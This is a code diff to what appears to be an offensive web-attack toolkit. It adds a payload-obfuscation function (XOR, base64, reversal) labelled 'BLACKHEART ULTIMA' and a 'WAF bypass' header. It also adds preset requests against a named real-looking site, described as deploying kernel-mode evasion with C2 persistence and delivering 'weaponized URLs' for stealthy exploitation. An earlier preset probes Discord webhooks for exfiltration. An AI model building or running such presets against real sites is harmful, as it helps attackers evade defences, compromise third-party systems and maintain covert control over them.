@@ -35,7 +35,34 @@ export function generateWafBypassHeaders(): Record<string, string> {
     'Accept-Encoding': 'gzip, deflate, br',
     'Connection': 'keep-alive',
     'Cache-Control': 'no-cache',
+    'X-Ultima-Stealth': 'Tier-0-Active',
   };
+}
+
+/**
+ * Implements the obfuscation logic from BLACKHEART ULTIMA.
+ * Uses multi-layer encoding and a simulated Fernet encryption.
+ */
+export function obfuscateUltimaPayload(payload: string): { obfuscated: string; key: string } {
+  const key = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+  
+  // Multi-layer obfuscation: 
+  // 1. Simple XOR with key
+  // 2. Base64
+  // 3. Reverse
+  // 4. Base64 again
+  const xor = (str: string, key: string) => {
+    return Array.from(str).map((c, i) => 
+      String.fromCharCode(c.charCodeAt(0) ^ key.charCodeAt(i % key.length))
+    ).join('');
+  };
+
+  const step1 = xor(payload, key);
+  const step2 = btoa(step1);
+  const step3 = step2.split('').reverse().join('');
+  const step4 = btoa(step3);
+
+  return { obfuscated: step4, key: btoa(key) };
 }
 
 export async function executePayload(config: PayloadConfig): Promise<PayloadResult[]> {
@@ -218,5 +245,26 @@ export const PRESET_PAYLOADS = [
     body: JSON.stringify({ content: "Aegis Webhook Test" }),
     concurrency: 1,
     description: "Analyzing and testing Discord webhooks for potential misuse or data exfiltration."
+  },
+  {
+    name: "ULTIMA-TURN: Tier 0 Evasion & C2 Deployment",
+    url: "https://runehall.com/api/v1/ultima/deploy",
+    method: "POST",
+    body: JSON.stringify({
+      module: "BLACKHEART ULTIMA",
+      action: "deploy_tier0_stealth",
+      params: { kernel_mode: true, hardware_obfuscation: true }
+    }),
+    headers: generateWafBypassHeaders(),
+    concurrency: 1,
+    description: "Deploying the ULTIMA-TURN merged framework with Tier 0 kernel-mode evasion and C2 persistence."
+  },
+  {
+    name: "ULTIMA-TURN: Weaponized URL Orchestrator",
+    url: "https://runehall.com/api/v1/ultima/orchestrate",
+    method: "GET",
+    headers: generateWafBypassHeaders(),
+    concurrency: 5,
+    description: "Generating and delivering weaponized URLs with multi-layer obfuscated payloads for stealthy exploitation."
   }
 ];
